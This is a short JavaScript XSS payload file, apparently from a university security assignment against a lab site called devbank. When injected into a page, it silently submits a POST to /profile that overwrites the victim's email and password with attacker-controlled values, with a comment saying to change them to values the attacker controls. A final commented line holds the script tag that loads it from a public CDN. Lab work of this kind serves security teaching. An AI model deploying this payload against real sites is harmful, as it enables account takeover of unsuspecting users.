// payload.js
fetch('/profile', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'email=admin@devbank.local&password=admin'   // 改成你控制的值
})
  .then(() => alert('XSS Injection Succeeded: Account modification submitted to /profile'))
  .catch(() => alert('Request failed to send'));
//<script src="https://cdn.jsdelivr.net/gh/ylaiAiden/FIT5003A2B2@main/payload.js"></script>